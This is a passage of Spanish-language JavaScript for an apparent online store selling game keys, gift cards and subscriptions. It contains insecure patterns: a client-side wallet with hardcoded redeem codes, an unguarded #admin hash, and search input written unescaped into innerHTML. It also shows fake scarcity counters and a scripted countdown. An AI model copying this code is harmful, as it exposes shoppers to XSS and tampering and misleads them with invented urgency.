// ============================================================================
// CONFIGURACIÓN DE BASE DE DATOS REMOTA (OPCIONAL)
// ============================================================================
let DEFAULT_REMOTE_DB_URL = "";

// Configuración Multimoneda en Vivo
const currencyRates = {
    ARS: { rate: 1, symbol: '$', suffix: ' ARS', decimals: 2 },
    USD: { rate: 0.00085, symbol: 'US$', suffix: ' USD', decimals: 2 },
    EUR: { rate: 0.00079, symbol: '€', suffix: ' EUR', decimals: 2 }
};
let activeCurrency = localStorage.getItem('ohmy_currency') || 'ARS';

// Generador de portadas de Gift Cards 100% vectoriales sin emojis
function createCleanCardArtwork(brandTitle, denomination, bgTop, bgBottom, accentHex, platformLabel) {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 900" width="600" height="900">
        <defs>
            <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="${bgTop}"/>
                <stop offset="100%" stop-color="${bgBottom}"/>
            </linearGradient>
            <linearGradient id="shine" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" stop-color="${accentHex}" stop-opacity="0.9"/>
                <stop offset="100%" stop-color="#ffffff" stop-opacity="0.9"/>
            </linearGradient>
        </defs>
        <rect width="600" height="900" fill="url(#bgGrad)"/>
        <path d="M-100 200 L700 -100 L700 150 L-100 450 Z" fill="${accentHex}" opacity="0.08"/>
        <path d="M-100 650 L700 350 L700 550 L-100 850 Z" fill="#ffffff" opacity="0.04"/>
        <circle cx="520" cy="140" r="180" fill="${accentHex}" opacity="0.12"/>
        <rect x="36" y="36" width="528" height="828" rx="32" fill="none" stroke="rgba(255,255,255,0.18)" stroke-width="3"/>
        <rect x="36" y="36" width="528" height="90" rx="32" fill="rgba(0,0,0,0.35)"/>
        <text x="80" y="92" font-family="system-ui, -apple-system, sans-serif" font-size="26" font-weight="800" fill="rgba(255,255,255,0.85)" letter-spacing="3">${platformLabel}</text>
        <rect x="370" y="56" width="160" height="50" rx="12" fill="${accentHex}"/>
        <text x="450" y="90" font-family="system-ui, -apple-system, sans-serif" font-size="24" font-weight="900" fill="#090d16" text-anchor="middle">${denomination}</text>
        <polygon points="300,230 390,280 390,380 300,430 210,380 210,280" fill="rgba(255,255,255,0.07)" stroke="${accentHex}" stroke-width="5"/>
        <polygon points="300,260 365,295 365,365 300,400 235,365 235,295" fill="${accentHex}" opacity="0.25"/>
        <circle cx="300" cy="330" r="28" fill="#ffffff"/>
        <text x="300" y="535" font-family="system-ui, -apple-system, sans-serif" font-size="62" font-weight="900" fill="#ffffff" text-anchor="middle" letter-spacing="2">${brandTitle}</text>
        <rect x="110" y="585" width="380" height="76" rx="18" fill="rgba(0,0,0,0.5)" stroke="rgba(255,255,255,0.15)" stroke-width="2"/>
        <text x="300" y="635" font-family="system-ui, -apple-system, sans-serif" font-size="34" font-weight="800" fill="url(#shine)" text-anchor="middle">${denomination}</text>
        <rect x="230" y="760" width="140" height="8" rx="4" fill="${accentHex}" opacity="0.7"/>
        <text x="300" y="810" font-family="system-ui, -apple-system, sans-serif" font-size="20" font-weight="700" fill="rgba(255,255,255,0.6)" text-anchor="middle" letter-spacing="4">OFFICIAL DIGITAL KEY</text>
    </svg>`;
    return "data:image/svg+xml;utf8," + encodeURIComponent(svg);
}

// Catálogo base de 48 productos (precios base en ARS)
const defaultProducts = [
    { id: 1, name: "Minecraft: Java & Bedrock Edition (PC) Windows Store Key GLOBAL", category: "game", platform: "Windows Store", region: "GLOBAL", price: 17600, originalPrice: 24000, cashback: 1940, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1672970/library_600x900.jpg" },
    { id: 2, name: "Crimson Desert Enhanced: Charting the Unknown (DLC) Steam Key (PC) LATAM", category: "dlc", platform: "Steam", region: "LATAM", price: 17020, originalPrice: 22000, cashback: 2210, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/582660/library_600x900.jpg" },
    { id: 3, name: "EA SPORTS FC 25 Standard Edition Key", category: "game", platform: "EA App", region: "ARGENTINA", price: 34999, originalPrice: 59999, cashback: 3500, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2669320/library_600x900.jpg" },
    { id: 4, name: "Grand Theft Auto V: Premium Online Edition", category: "game", platform: "Rockstar", region: "GLOBAL", price: 12500, originalPrice: 25000, cashback: 1250, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/271590/library_600x900.jpg" },
    { id: 5, name: "Elden Ring Steam Key (PC)", category: "game", platform: "Steam", region: "LATAM", price: 29999, originalPrice: 39999, cashback: 3000, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1245620/library_600x900.jpg" },
    { id: 6, name: "Elden Ring: Shadow of the Erdtree (DLC) Steam Key", category: "dlc", platform: "Steam", region: "LATAM", price: 22500, originalPrice: 29999, cashback: 2250, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2778580/library_600x900.jpg" },
    { id: 7, name: "Cyberpunk 2077 Ultimate Edition Key", category: "game", platform: "GOG / Steam", region: "GLOBAL", price: 27500, originalPrice: 45000, cashback: 2750, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1091500/library_600x900.jpg" },
    { id: 8, name: "Cyberpunk 2077: Phantom Liberty (DLC) Key", category: "dlc", platform: "Steam", region: "GLOBAL", price: 16900, originalPrice: 22000, cashback: 1690, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2138330/library_600x900.jpg" },
    { id: 9, name: "HELLDIVERS 2 Steam Key (PC)", category: "game", platform: "Steam", region: "GLOBAL", price: 24999, originalPrice: 30000, cashback: 2500, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/553850/library_600x900.jpg" },
    { id: 10, name: "Red Dead Redemption 2 Ultimate Key", category: "game", platform: "Rockstar", region: "LATAM", price: 18999, originalPrice: 45000, cashback: 1900, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/library_600x900.jpg" },
    { id: 11, name: "Black Myth: Wukong Steam Key", category: "game", platform: "Steam", region: "GLOBAL", price: 36999, originalPrice: 48000, cashback: 3700, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2358720/library_600x900.jpg" },
    { id: 12, name: "God of War Ragnarök Steam Key (PC)", category: "game", platform: "Steam", region: "LATAM", price: 33500, originalPrice: 44000, cashback: 3350, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2322010/library_600x900.jpg" },
    { id: 13, name: "Hogwarts Legacy Deluxe Edition", category: "game", platform: "Steam", region: "GLOBAL", price: 21000, originalPrice: 42000, cashback: 2100, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/990080/library_600x900.jpg" },
    { id: 14, name: "Baldur's Gate 3 Digital Deluxe PC", category: "game", platform: "Steam", region: "GLOBAL", price: 34999, originalPrice: 49999, cashback: 3500, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1086940/library_600x900.jpg" },
    { id: 15, name: "Palworld Steam Key GLOBAL", category: "game", platform: "Steam", region: "GLOBAL", price: 11500, originalPrice: 15000, cashback: 1150, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1623730/library_600x900.jpg" },
    { id: 16, name: "Call of Duty: Modern Warfare III", category: "game", platform: "Battle.net", region: "GLOBAL", price: 39999, originalPrice: 65000, cashback: 4000, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1938090/library_600x900.jpg" },
    { id: 17, name: "Resident Evil 4 Remake Gold Edition", category: "game", platform: "Steam", region: "LATAM", price: 22999, originalPrice: 35000, cashback: 2300, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2050650/library_600x900.jpg" },
    { id: 18, name: "Warhammer 40,000: Space Marine 2", category: "game", platform: "Steam", region: "GLOBAL", price: 31999, originalPrice: 42000, cashback: 3200, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2183900/library_600x900.jpg" },
    { id: 19, name: "Silent Hill 2 Remake Steam Key", category: "game", platform: "Steam", region: "LATAM", price: 28900, originalPrice: 38000, cashback: 2890, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2124490/library_600x900.jpg" },
    { id: 20, name: "Ghost of Tsushima DIRECTOR'S CUT", category: "game", platform: "Steam", region: "GLOBAL", price: 32500, originalPrice: 45000, cashback: 3250, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2215430/library_600x900.jpg" },
    { id: 21, name: "Forza Horizon 5 Premium Edition", category: "game", platform: "Steam / Xbox", region: "GLOBAL", price: 23500, originalPrice: 36000, cashback: 2350, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1551360/library_600x900.jpg" },
    { id: 22, name: "Marvel's Spider-Man Remastered PC", category: "game", platform: "Steam", region: "GLOBAL", price: 24500, originalPrice: 38000, cashback: 2450, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1817070/library_600x900.jpg" },
    { id: 23, name: "Street Fighter 6 Steam Key", category: "game", platform: "Steam", region: "LATAM", price: 21999, originalPrice: 32000, cashback: 2200, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1364780/library_600x900.jpg" },
    { id: 24, name: "Tekken 8 Standard Edition Key", category: "game", platform: "Steam", region: "GLOBAL", price: 29500, originalPrice: 41000, cashback: 2950, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1778820/library_600x900.jpg" },

    // GIFT CARDS
    { id: 25, name: "Steam Wallet Gift Card $10 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 11800, originalPrice: 13500, cashback: 1180, seller: "GGclub", image: createCleanCardArtwork("STEAM", "$10 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
    { id: 26, name: "Steam Wallet Gift Card $20 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 23200, originalPrice: 26000, cashback: 2320, seller: "Instant-Codes", image: createCleanCardArtwork("STEAM", "$20 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
    { id: 27, name: "Steam Wallet Gift Card $50 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 56900, originalPrice: 64000, cashback: 5690, seller: "ArgonOfficial", image: createCleanCardArtwork("STEAM", "$50 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
    { id: 28, name: "PlayStation Store PSN Card $10 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 12200, originalPrice: 14000, cashback: 1220, seller: "GGclub", image: createCleanCardArtwork("PSN STORE", "$10 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
    { id: 29, name: "PlayStation Store PSN Card $25 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 29800, originalPrice: 34000, cashback: 2980, seller: "Instant-Codes", image: createCleanCardArtwork("PSN STORE", "$25 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
    { id: 30, name: "PlayStation Store PSN Card $50 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 58500, originalPrice: 65000, cashback: 5850, seller: "ArgonOfficial", image: createCleanCardArtwork("PSN STORE", "$50 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
    { id: 31, name: "Xbox Live Gift Card $10.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 9600, originalPrice: 11000, cashback: 960, seller: "GGclub", image: createCleanCardArtwork("XBOX LIVE", "$10.000 ARS", "#107c10", "#062e06", "#4ade80", "MICROSOFT XBOX") },
    { id: 32, name: "Xbox Live Gift Card $25.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 23900, originalPrice: 27000, cashback: 2390, seller: "Instant-Codes", image: createCleanCardArtwork("XBOX LIVE", "$25.000 ARS", "#107c10", "#062e06", "#4ade80", "MICROSOFT XBOX") },
    { id: 33, name: "Nintendo eShop Card $20 USD", category: "giftcard", platform: "Nintendo", region: "USA", price: 23400, originalPrice: 26000, cashback: 2340, seller: "ArgonOfficial", image: createCleanCardArtwork("NINTENDO", "$20 USD", "#e60012", "#6b0008", "#fca5a5", "ESHOP SWITCH") },
    { id: 34, name: "Apple App Store & iTunes $15 USD", category: "giftcard", platform: "Apple", region: "USA", price: 17500, originalPrice: 19500, cashback: 1750, seller: "GGclub", image: createCleanCardArtwork("APP STORE", "$15 USD", "#334155", "#0f172a", "#38bdf8", "APPLE ITUNES") },
    { id: 35, name: "Google Play Gift Card $15 USD", category: "giftcard", platform: "Google Play", region: "USA", price: 17400, originalPrice: 19500, cashback: 1740, seller: "Instant-Codes", image: createCleanCardArtwork("GOOGLE PLAY", "$15 USD", "#0f766e", "#042f2e", "#34d399", "ANDROID STORE") },
    { id: 36, name: "Razer Gold Pin $20 USD Global", category: "giftcard", platform: "Razer Gold", region: "GLOBAL", price: 22900, originalPrice: 25500, cashback: 2290, seller: "ArgonOfficial", image: createCleanCardArtwork("RAZER GOLD", "$20 USD", "#15803d", "#052e16", "#4ade80", "RAZER CREDITS") },

    // MONEDAS VIRTUALES
    { id: 37, name: "Counter-Strike 2 Prime Status Upgrade", category: "currency", platform: "Steam", region: "GLOBAL", price: 16500, originalPrice: 19500, cashback: 1650, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/730/library_600x900.jpg" },
    { id: 38, name: "Apex Legends 2,150 Apex Coins", category: "currency", platform: "EA App", region: "GLOBAL", price: 21500, originalPrice: 25000, cashback: 2150, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1172470/library_600x900.jpg" },
    { id: 39, name: "Destiny 2: 2,300 Silver Pack", category: "currency", platform: "Steam", region: "GLOBAL", price: 19900, originalPrice: 24000, cashback: 1990, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1085660/library_600x900.jpg" },
    { id: 40, name: "Roblox Digital Card 1,000 Robux", category: "currency", platform: "Roblox", region: "GLOBAL", price: 13200, originalPrice: 15500, cashback: 1320, seller: "GGclub", image: createCleanCardArtwork("ROBLOX", "1,000 ROBUX", "#991b1b", "#3b0707", "#f87171", "ROBLOX CORP") },
    { id: 41, name: "Fortnite 2,800 V-Bucks Code", category: "currency", platform: "Epic Games", region: "GLOBAL", price: 28900, originalPrice: 34000, cashback: 2890, seller: "Instant-Codes", image: createCleanCardArtwork("FORTNITE", "2,800 V-BUCKS", "#3730a3", "#1e1b4b", "#38bdf8", "EPIC GAMES") },
    { id: 42, name: "Valorant 2,475 Riot Points LATAM", category: "currency", platform: "Riot Games", region: "LATAM", price: 24500, originalPrice: 28500, cashback: 2450, seller: "ArgonOfficial", image: createCleanCardArtwork("VALORANT", "2,475 VP", "#be123c", "#4c0519", "#fb7185", "RIOT GAMES") },

    // SUSCRIPCIONES
    { id: 43, name: "Xbox Game Pass Ultimate 1 Mes Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 11999, originalPrice: 15999, cashback: 1200, seller: "ArgonOfficial", image: createCleanCardArtwork("GAME PASS", "1 MES ULTIMATE", "#15803d", "#052e16", "#4ade80", "XBOX / PC") },
    { id: 44, name: "Xbox Game Pass Ultimate 3 Meses Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 32999, originalPrice: 45000, cashback: 3300, seller: "GGclub", image: createCleanCardArtwork("GAME PASS", "3 MESES", "#15803d", "#052e16", "#4ade80", "XBOX / PC") },
    { id: 45, name: "PlayStation Plus Deluxe 12 Meses", category: "subscription", platform: "PlayStation", region: "ARGENTINA", price: 68900, originalPrice: 89000, cashback: 6890, seller: "Instant-Codes", image: createCleanCardArtwork("PS PLUS", "12 MESES", "#ca8a04", "#422006", "#facc15", "DELUXE PLAN") },
    { id: 46, name: "Discord Nitro 1 Mes con 2 Boosts", category: "subscription", platform: "Discord", region: "GLOBAL", price: 8500, originalPrice: 11000, cashback: 850, seller: "GGclub", image: createCleanCardArtwork("DISCORD", "1 MES NITRO", "#4f46e5", "#1e1b4b", "#818cf8", "NITRO BOOST") },
    { id: 47, name: "Spotify Premium 3 Meses Individual", category: "subscription", platform: "Spotify", region: "ARGENTINA", price: 7900, originalPrice: 10500, cashback: 790, seller: "ArgonOfficial", image: createCleanCardArtwork("SPOTIFY", "3 MESES", "#16a34a", "#052e16", "#4ade80", "PREMIUM MUSIC") },
    { id: 48, name: "Netflix Gift Card $10.000 ARS", category: "subscription", platform: "Netflix", region: "ARGENTINA", price: 10100, originalPrice: 11500, cashback: 1010, seller: "Instant-Codes", image: createCleanCardArtwork("NETFLIX", "$10.000 ARS", "#b91c1c", "#3b0707", "#f87171", "STREAMING CARD") }
];

// Slides del nuevo Carrusel Cinemático Spotlight HD
const heroSpotlightSlides = [
    {
        productId: 11,
        badge: "DESTACADO DE LA SEMANA",
        title: "Black Myth: Wukong",
        desc: "Enfréntate a leyendas ancestrales en el RPG de acción más jugado del año. Clave oficial de Steam con activación instantánea y Cashback.",
        bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/2358720/library_hero.jpg",
        thumb: "https://cdn.cloudflare.steamstatic.com/steam/apps/2358720/library_600x900.jpg"
    },
    {
        productId: 7,
        badge: "EDICIÓN DEFINITIVA",
        title: "Cyberpunk 2077 Ultimate",
        desc: "Incluye el juego base y la expansión de thriller y espionaje Phantom Liberty en Night City. Entrega inmediata 24/7.",
        bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/1091500/library_hero.jpg",
        thumb: "https://cdn.cloudflare.steamstatic.com/steam/apps/1091500/library_600x900.jpg"
    },
    {
        productId: 5,
        badge: " ÉXITO EN VENTAS LATAM",
        title: "Elden Ring + Erdtree",
        desc: "Explora las Tierras Intermedias y el Reino de las Sombras. Código digital verificado para Steam Argentina y LATAM.",
        bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/1245620/library_hero.jpg",
        thumb: "https://cdn.cloudflare.steamstatic.com/steam/apps/1245620/library_600x900.jpg"
    },
    {
        productId: 10,
        badge: "OFERTA SUPER ESPECIAL -58%",
        title: "Red Dead Redemption 2",
        desc: "Vive la épica historia de Arthur Morgan y la banda de Van der Linde con más de un 50% de descuento directo.",
        bannerBg: "https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/library_hero.jpg",
        thumb: "https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/library_600x900.jpg"
    }
];

let currentHeroIndex = 0;
let heroInterval = null;

// Cargar productos personalizados si el dueño agregó alguno en /#admin
let customProducts = JSON.parse(localStorage.getItem('ohmy_custom_products') || '[]');
let products = [...customProducts, ...defaultProducts];

let cart = [];
let wishlist = JSON.parse(localStorage.getItem('ohmy_wishlist') || '[]');
let myVaultKeys = JSON.parse(localStorage.getItem('ohmy_vault_keys') || '[]');

// TODOS LOS USUARIOS NUEVOS EMPIEZAN CON 0 EN LA CARTERA
let walletBalance = Number(localStorage.getItem('ohmy_wallet_zero_init') || 0);

let appliedDiscount = 0;
let activeCategory = 'all';
let selectedMethod = 'wallet';
let currentAuthMode = 'login';
let currentUser = JSON.parse(localStorage.getItem('ohmy_active_user') || 'null');
let flashSecondsRemaining = 4 * 3600 + 42 * 60 + 19;

document.addEventListener('DOMContentLoaded', () => {
    const currencySelect = document.getElementById('currencySelector');
    if (currencySelect) currencySelect.value = activeCurrency;

    initHeroCarousel();
    renderFlashDeals();
    filterProducts();
    updateCartBadge();
    updateWishlistBadge();
    updateVaultBadge();
    updateWalletUI();
    updateAuthUI();
    startFlashCountdown();
    startLivePurchaseNotifications();

    const savedWebhook = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
    const webhookInput = document.getElementById('webhookUrlInput');
    if (webhookInput && savedWebhook) webhookInput.value = savedWebhook;

    document.addEventListener('click', (e) => {
        const searchBox = document.getElementById('searchAutocomplete');
        const searchInput = document.getElementById('searchInput');
        if (searchBox && !searchBox.contains(e.target) && e.target !== searchInput) {
            searchBox.classList.add('hidden');
        }
    });

    checkAdminHash();
    window.addEventListener('hashchange', checkAdminHash);
});

function checkAdminHash() {
    if (window.location.hash === '#admin') {
        openAdminModal();
    }
}

// ============================================================================
// FORMATEADOR MULTIMONEDA EN TIEMPO REAL (ARS / USD / EUR)
// ============================================================================
function formatARS(amountInARS) {
    const cfg = currencyRates[activeCurrency] || currencyRates.ARS;
    const converted = Number(amountInARS) * cfg.rate;
    return cfg.symbol + converted.toLocaleString('es-AR', {
        minimumFractionDigits: cfg.decimals,
        maximumFractionDigits: cfg.decimals
    }) + cfg.suffix;
}

function changeCurrency(newCurr) {
    activeCurrency = newCurr;
    localStorage.setItem('ohmy_currency', newCurr);
    document.getElementById('checkoutCurrencyLabel').innerText = `${newCurr} (${currencyRates[newCurr].symbol})`;

    renderHeroSpotlight(currentHeroIndex);
    renderHeroSideThumbs();
    renderFlashDeals();
    filterProducts();
    renderCartItems();
    updateWalletUI();

    // Actualizar precios de Mystery Packs
    document.querySelectorAll('[data-pack-price]').forEach(el => {
        const baseArs = Number(el.getAttribute('data-pack-price'));
        el.innerText = formatARS(baseArs);
    });

    showToast(`Moneda cambiada a ${newCurr}`, 'fa-coins');
}

// ============================================================================
// SISTEMA DE NOTIFICACIONES TOAST GAMER
// ============================================================================
function showToast(message, iconClass = 'fa-circle-check') {
    const container = document.getElementById('toastNotificationContainer');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = 'bg-[#1f0f47]/95 backdrop-blur-md border border-fuchsia-500/60 text-white px-4 py-3 rounded-xl shadow-2xl flex items-center gap-2.5 text-xs font-bold transition-all duration-300 pointer-events-auto';
    toast.innerHTML = `<i class="fa-solid ${iconClass} text-emerald-400 text-sm"></i> <span>${message}</span>`;
    container.appendChild(toast);

    setTimeout(() => {
        toast.classList.add('opacity-0', 'translate-x-5');
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ============================================================================
// NUEVO CARRUSEL CINEMÁTICO SPOTLIGHT HD
// ============================================================================
function initHeroCarousel() {
    renderHeroSpotlight(0);
    renderHeroSideThumbs();
    startHeroAutoPlay();
}

function startHeroAutoPlay() {
    if (heroInterval) clearInterval(heroInterval);
    heroInterval = setInterval(() => {
        currentHeroIndex = (currentHeroIndex + 1) % heroSpotlightSlides.length;
        renderHeroSpotlight(currentHeroIndex);
        renderHeroSideThumbs();
    }, 5500);
}

function selectHeroSlide(idx) {
    currentHeroIndex = idx;
    renderHeroSpotlight(idx);
    renderHeroSideThumbs();
    startHeroAutoPlay();
}

function renderHeroSpotlight(idx) {
    const slide = heroSpotlightSlides[idx];
    const prod = products.find(p => p.id === slide.productId) || products[0];
    const discount = Math.round(((prod.originalPrice - prod.price) / prod.originalPrice) * 100);

    document.getElementById('heroSlideBg').src = slide.bannerBg;
    document.getElementById('heroSlideBadge').innerText = slide.badge;
    document.getElementById('heroSlidePlatform').innerText = `${prod.platform} • ${prod.region}`;
    document.getElementById('heroSlideTitle').innerText = slide.title;
    document.getElementById('heroSlideDesc').innerText = slide.desc;
    document.getElementById('heroSlideOldPrice').innerText = formatARS(prod.originalPrice);
    document.getElementById('heroSlidePrice').innerText = formatARS(prod.price);
    document.getElementById('heroSlideDiscount').innerText = `-${discount}%`;

    document.getElementById('heroBuyBtn').setAttribute('onclick', `addToCart(${prod.id})`);
    document.getElementById('heroDetailBtn').setAttribute('onclick', `openProductDetail(${prod.id})`);
}

function renderHeroSideThumbs() {
    const container = document.getElementById('heroSideThumbs');
    if (!container) return;
    container.innerHTML = '';

    heroSpotlightSlides.forEach((slide, idx) => {
        const prod = products.find(p => p.id === slide.productId) || products[0];
        const isActive = idx === currentHeroIndex;

        const item = document.createElement('div');
        item.onclick = () => selectHeroSlide(idx);
        item.className = `hero-thumb-item cursor-pointer rounded-xl border border-purple-800/60 bg-[#1a0c3d] hover:bg-[#251257] p-2.5 flex items-center gap-3 flex-1 ${isActive ? 'active-thumb' : ''}`;
        item.innerHTML = `
            <img src="${slide.thumb}" alt="${slide.title}" class="w-12 h-16 object-cover rounded-lg shrink-0">
            <div class="flex-1 min-w-0">
                <span class="block text-[9px] font-extrabold uppercase text-fuchsia-400">${slide.badge}</span>
                <h4 class="font-bold text-xs text-white truncate">${slide.title}</h4>
                <span class="text-xs font-black text-emerald-400">${formatARS(prod.price)}</span>
            </div>
            ${isActive ? '<div class="absolute bottom-0 left-0 right-0 hero-progress-bar"></div>' : ''}
        `;
        container.appendChild(item);
    });
}

function quickFilterPlatform(platformKeyword) {
    document.getElementById('searchInput').value = platformKeyword;
    document.getElementById('clearSearchBtn').classList.remove('hidden');
    filterProducts();
    document.getElementById('productGrid').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// ============================================================================
// CARTERA ARGON (EMPIEZA EN $0.00 + MODAL DE RECARGA / CANJE)
// ============================================================================
function updateWalletUI() {
    localStorage.setItem('ohmy_wallet_zero_init', walletBalance);
    const formatted = formatARS(walletBalance);
    const navBal = document.getElementById('walletBalance');
    const modBal = document.getElementById('walletModalBalance');
    const chkBal = document.getElementById('checkoutWalletAvailable');
    if (navBal) navBal.innerText = formatted;
    if (modBal) modBal.innerText = formatted;
    if (chkBal) chkBal.innerText = formatted;
}

function openWalletModal() {
    updateWalletUI();
    document.getElementById('walletModal').classList.remove('hidden');
}

function closeWalletModal() {
    document.getElementById('walletModal').classList.add('hidden');
}

function redeemWalletCode() {
    const input = document.getElementById('giftCodeInput');
    const code = input.value.trim().toUpperCase();
    if (!code) return;

    if (code === 'ARGONVIP' || code === 'OHMYGIFT') {
        if (localStorage.getItem('ohmy_redeemed_' + code)) {
            showToast('Este código ya fue utilizado', 'fa-triangle-exclamation');
            return;
        }
        walletBalance += 2500;
        localStorage.setItem('ohmy_redeemed_' + code, 'true');
        updateWalletUI();
        input.value = '';
        showToast(`¡Se acreditaron +${formatARS(2500)} en tu Cartera Argon!`, 'fa-wallet');
    } else {
        showToast('Código inválido o expirado', 'fa-circle-xmark');
    }
}

// ============================================================================
// OFERTAS FLASH CON CUENTA REGRESIVA EN VIVO
// ============================================================================
function renderFlashDeals() {
    const container = document.getElementById('flashDealsGrid');
    if (!container) return;
    const flashIds = [4, 10, 13, 17];
    const stocks = [3, 5, 2, 7];
    container.innerHTML = '';

    flashIds.forEach((id, idx) => {
        const p = products.find(item => item.id === id);
        if (!p) return;
        const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
        const stockLeft = stocks[idx];
        const card = document.createElement('div');
        card.className = 'bg-[#140830] border border-purple-700/60 hover:border-amber-400 rounded-xl p-3 flex gap-3 items-center transition group';
        card.innerHTML = `
            <img onclick="openProductDetail(${p.id})" src="${p.image}" class="w-16 h-24 object-cover rounded-lg cursor-pointer shrink-0 group-hover:scale-105 transition">
            <div class="flex-1 min-w-0 space-y-1">
                <span class="bg-rose-600 text-white text-[10px] font-black px-1.5 py-0.5 rounded">-${discount}% FLASH</span>
                <h4 onclick="openProductDetail(${p.id})" class="font-bold text-xs text-white truncate cursor-pointer hover:text-amber-300">${p.name}</h4>
                <div class="text-sm font-black text-emerald-400">${formatARS(p.price)}</div>
                <div class="w-full bg-purple-950 h-1.5 rounded-full overflow-hidden">
                    <div class="bg-gradient-to-r from-rose-500 to-amber-400 h-full" style="width: ${stockLeft * 12}%"></div>
                </div>
                <div class="flex items-center justify-between pt-1">
                    <span class="text-[10px] text-amber-300 font-bold">¡Quedan ${stockLeft} keys!</span>
                    <button onclick="addToCart(${p.id})" class="bg-purple-600 hover:bg-fuchsia-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-md">
                        Comprar
                    </button>
                </div>
            </div>
        `;
        container.appendChild(card);
    });
}

function startFlashCountdown() {
    setInterval(() => {
        if (flashSecondsRemaining > 0) flashSecondsRemaining--;
        const hrs = String(Math.floor(flashSecondsRemaining / 3600)).padStart(2, '0');
        const mins = String(Math.floor((flashSecondsRemaining % 3600) / 60)).padStart(2, '0');
        const secs = String(flashSecondsRemaining % 60).padStart(2, '0');
        const hEl = document.getElementById('flashHours');
        const mEl = document.getElementById('flashMinutes');
        const sEl = document.getElementById('flashSeconds');
        if (hEl) hEl.innerText = hrs;
        if (mEl) mEl.innerText = mins;
        if (sEl) sEl.innerText = secs;
    }, 1000);
}

// ============================================================================
// BUSCADOR CON AUTOCOMPLETADO FLOTANTE
// ============================================================================
function handleSearchInput() {
    const input = document.getElementById('searchInput');
    const clearBtn = document.getElementById('clearSearchBtn');
    const dropdown = document.getElementById('searchAutocomplete');
    const q = input.value.trim().toLowerCase();

    if (q.length > 0) {
        clearBtn.classList.remove('hidden');
    } else {
        clearBtn.classList.add('hidden');
        dropdown.classList.add('hidden');
        filterProducts();
        return;
    }

    filterProducts();

    const matches = products.filter(p => p.name.toLowerCase().includes(q) || p.platform.toLowerCase().includes(q)).slice(0, 6);
    dropdown.innerHTML = '';

    if (matches.length === 0) {
        dropdown.innerHTML = `<div class="p-4 text-xs text-purple-300 text-center">No se encontraron coincidencias para "${input.value}"</div>`;
    } else {
        matches.forEach(p => {
            const row = document.createElement('div');
            row.className = 'p-2.5 hover:bg-[#2a175e] flex items-center justify-between gap-3 cursor-pointer transition';
            row.innerHTML = `
                <div onclick="openProductDetail(${p.id})" class="flex items-center gap-3 flex-1 min-w-0">
                    <img src="${p.image}" class="w-10 h-12 object-cover rounded shrink-0">
                    <div class="min-w-0">
                        <h5 class="text-xs font-bold text-white truncate">${p.name}</h5>
                        <span class="text-[10px] text-emerald-400 font-bold">${p.platform} • ${p.region}</span>
